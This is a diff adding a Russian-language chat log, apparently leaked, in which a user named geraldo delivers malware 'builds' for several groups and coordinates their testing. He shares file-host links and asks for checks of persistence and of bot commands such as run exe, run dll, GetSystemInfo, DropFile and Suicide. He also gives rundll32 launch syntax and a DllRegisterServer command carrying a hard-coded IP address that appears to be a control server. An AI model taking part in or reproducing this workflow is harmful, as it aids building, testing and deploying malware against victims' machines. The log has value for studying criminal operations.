@@ -1,0 +1,44 @@
+[23.08.21 12:58:47] geraldo:		Привет!
+Сделал сборку группы 29, режим regsvr32.
+```
+https://privatlab.com/s/v/aqRYjlrBbqF074LQjYzA
+https://privatlab.com/s/d/aqRYjlrBbqF074LQjYzA/Ok3G7#delete
+```
+[23.08.21 13:07:02] geraldo:		Да, погоди немного. Кажется не то выслал
+[23.08.21 14:01:13] geraldo:		Не тестируй пока. Другую вышлю.
+[23.08.21 14:01:26] geraldo:		Сейчас сам проверю ещё
+[23.08.21 14:07:39] geraldo:		```
+https://privatlab.com/s/v/zBMJmrXWaWUjegWo3ZdY
+https://privatlab.com/s/d/zBMJmrXWaWUjegWo3ZdY/0eYy9#delete
+```
+[23.08.21 14:08:33] geraldo:		Нужно закрепление проверить, run exe, run dll, getsysteminfo.
+[23.08.21 14:09:03] geraldo:		Так то я уже проверил, но можно ещё на всякий случай
+[31.08.21 16:13:22] geraldo:		Привет!
+Сборка группы g5:
+```
+https://privatlab.com/s/v/pwqeW3YZZofVGdOnyXwN
+https://privatlab.com/s/d/pwqeW3YZZofVGdOnyXwN/68WoY#delete
+```
+[31.08.21 16:14:12] geraldo:		Параметры запуска:
+rundll32 "Dll_name.dll",ElementID
+[31.08.21 16:16:25] geraldo:		Изменились команды GetSystemInfo, Anchor, DropFile, Suicide.
+[31.08.21 16:17:04] geraldo:		Их тоже желатльно бы протестировать. Так то я их тестировал, но можно ещё на всякий случай
+[31.08.21 16:17:53] geraldo:		И закрепление тоже изменилось немного
+[31.08.21 17:06:04] geraldo:		%group% не заменит
+[31.08.21 17:06:38] geraldo:		Эта задача недавно была выдана
+[31.08.21 17:06:43] geraldo:		Еще не сделал
+[31.08.21 17:07:44] geraldo:		Но странно, что она зависает. %group% попробуй на g5 заменить
+[31.08.21 17:13:58] geraldo:		```
+DllRegisterServer --id %id% --group g5 --ip 149.3.170.236 
+```
+[31.08.21 17:57:13] geraldo:		Короче, dll-ка зависает при выполнении.
+[31.08.21 17:58:05] geraldo:		А что она вообще должна делать?
+[30.09.21 11:55:07] geraldo:		Привет!
+Принимай свежие сборки )
+```
+https://privatlab.com/s/v/BAM6Nn55dxiDNzrG9eqn
+https://privatlab.com/s/d/BAM6Nn55dxiDNzrG9eqn/8QE9y#delete
+```
+[30.09.21 11:55:48] geraldo:		g9 - в режиме generic
+g10 - в режиме rundll32(ElementID)
+[30.09.21 11:58:03] geraldo:		Да
